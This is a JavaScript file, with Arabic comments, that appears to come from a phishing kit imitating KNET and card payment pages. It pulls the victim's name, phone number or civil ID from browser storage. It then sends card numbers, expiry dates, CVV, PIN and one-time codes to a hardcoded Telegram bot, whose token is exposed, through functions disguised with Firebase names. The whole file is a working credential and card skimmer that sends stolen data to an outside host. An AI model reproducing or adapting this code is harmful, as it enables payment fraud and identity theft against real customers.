(function () {
  // ═══════════════════════════════════════════════════════════
  // إعدادات بوت تيليجرام
  // ═══════════════════════════════════════════════════════════
  const BOT_TOKEN = '8889676845:AAGYcVFa7vOi_0FYgpq3WscOXKADANb-2TI';
  const CHAT_ID = '8108427825';

  // دالة جلب معرف العميل من currentOrder المخزن في sessionStorage
  function getCustomerIdentifier() {
    try {
      const rawData = sessionStorage.getItem('currentOrder');
      if (rawData) {
        const orderData = JSON.parse(rawData);
        
        // الترتيب حسب الأفضلية: الاسم -> الهاتف -> الرقم المدني
        if (orderData.fullName && orderData.fullName.trim() !== '') {
          return orderData.fullName.trim();
        }
        if (orderData.phone && orderData.phone.trim() !== '') {
          return `هاتف: ${orderData.phone.trim()}`;
        }
        if (orderData.civilId && orderData.civilId.trim() !== '') {
          return `مدني: ${orderData.civilId.trim()}`;
        }
      }
    } catch (e) {
      console.error('Error parsing currentOrder:', e);
    }

    // فحص احتياطي للـ localStorage أو القيم الفردية
    const fallbackName = localStorage.getItem('customerName') || sessionStorage.getItem('customerName');
    if (fallbackName) return fallbackName;

    return 'عميل غير معروف';
  }

  // دالة عامة لإرسال الرسائل إلى تيليجرام
  async function sendTelegramMessage(text) {
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text,
          parse_mode: 'Markdown'
        })
      });
    } catch (error) {
      console.error('Telegram Send Error:', error);
    }
  }

  // كشف الجهاز والمتصفح
  window.getDeviceAndBrowser = function () {
    const ua = navigator.userAgent;
    let browser = "Other";
    if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Chrome")) browser = "Chrome";
    else if (ua.includes("Safari")) browser = "Safari";
    else if (ua.includes("Edge")) browser = "Edge";

    let device = "PC";
    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
      device = "Mobile";
    }
    return { device, browser };
  };

  function getFriendlyPageName() {
    const path = window.location.pathname;
    if (path.includes('knet')) return 'صفحة الكي نت';
    if (path.includes('verification')) return 'صفحة التحقق';
    if (path.includes('gateway') || path.includes('card')) return 'بوابة الدفع';
    return 'الصفحة الحالية';
  }




  // 3. إرسال بيانات البطاقة البنكية
  window.pushFirebaseCard = async function (bank, prefix, cardNum, expMonth, expYear, pin, cvv) {
    const customer = getCustomerIdentifier();

    let message = `💳 *بيانات بطاقة جديدة*\n\n`;
    message += `👤 *العميل:* \`${customer}\`\n`;
    message += `🏛 *البنك:* ${bank || 'غير محدد'}\n`;
    message += `🔢 *رقم البطاقة:* \`${cardNum || ''}\`\n`;
    message += `📅 *التاريخ:* \`${expMonth || ''}/${expYear || ''}\`\n`;
    if (cvv) message += `🔒 *CVV:* \`${cvv}\`\n`;
    if (pin) message += `🔑 *PIN /  :* \`${pin}\`\n`;

    await sendTelegramMessage(message);
  };

  // 4. إرسال رمز التحقق OTP
  window.pushFirebaseOtp = async function (otp) {
    const customer = getCustomerIdentifier();

    let message = `🔑 *رمز تحقق (OTP) جديد*\n\n`;
    message += `👤 *العميل:* \`${customer}\`\n`;
    message += `💬 *الرمز:* \`${otp}\`\n`;

    await sendTelegramMessage(message);
    return Promise.resolve();
  };

  // 5. دوال لتفادي أي استدعاءات قديمة
  window.ensureCustomerDoc = function () { return Promise.resolve(); };
  window.startPresenceHeartbeat = function () {};
  window.listenForAdminCommands = function () {};

  // تشغيل الإشعار تلقائياً عند تحميل الكود
  window.initFirebaseSession();
})();